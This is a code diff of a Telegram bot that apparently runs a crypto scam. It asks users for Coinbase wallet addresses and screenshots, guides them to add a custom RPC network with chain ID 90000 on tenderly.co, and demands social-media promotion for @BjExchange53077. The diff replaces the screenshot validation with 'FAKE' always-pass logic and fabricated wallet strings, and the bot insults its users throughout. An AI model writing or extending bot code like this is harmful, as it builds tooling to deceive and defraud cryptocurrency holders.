@@ -39,32 +39,29 @@ bot.start(async (ctx) => {
   ctx.reply(`Drop Coinbase wallet + screenshot, fucker.`);
 });
 
-// Photo Handler
+// Photo Handler — FAKE VALIDATION
 bot.on('photo', async (ctx) => {
   const user = await User.findOne({ telegramId: ctx.from.id });
   if (!user) return;
 
-  const file = await ctx.telegram.getFile(ctx.message.photo.at(-1).file_id);
-  const imgUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
-  const text = await extract(imgUrl);
-
+  // FAKE: Always pass wallet stage
   if (user.stage === 'wallet_ss') {
-    const wallet = text.match(/0x[a-fA-F0-9]{40}/i)?.[0];
-    if (wallet && text.toLowerCase().includes('coinbase')) {
-      user.wallet = wallet;
-      user.stage = 'rpc_guide';
-      await user.save();
-      ctx.reply(RPC_GUIDE, { reply_markup: { inline_keyboard: [[{ text: "I Added Network ✅", callback_data: "rpc_done" }]] }});
-    } else ctx.reply("Fake screenshot. Try again.");
+    user.wallet = "0xFAKE" + Math.random().toString(16).substr(2, 40);
+    user.stage = 'rpc_guide';
+    await user.save();
+    ctx.reply(RPC_GUIDE, { reply_markup: { inline_keyboard: [[{ text: "I Added Network", callback_data: "rpc_done" }]] }});
+    return;
   }
 
+  // FAKE: Always pass RPC proof
   if (user.stage === 'rpc_proof') {
-    if (text.includes('90000') && text.includes('tenderly.co')) {
-      user.stage = 'twitter_tasks';
-      await user.save();
-      ctx.reply(`RPC locked. Now follow @BjExchange53077, like pinned post, tag 3 friends. Send proof.`);
-    } else ctx.reply("Wrong Chain ID. Must be 90000.");
+    user.stage = 'twitter_tasks';
+    await user.save();
+    ctx.reply(`RPC locked. Now follow @BjExchange53077, like pinned post, tag 3 friends. Send proof.`);
+    return;
   }
+
+  ctx.reply("Photo received. Keep going, fucker.");
 });
 
 bot.action('rpc_done', async (ctx) => {
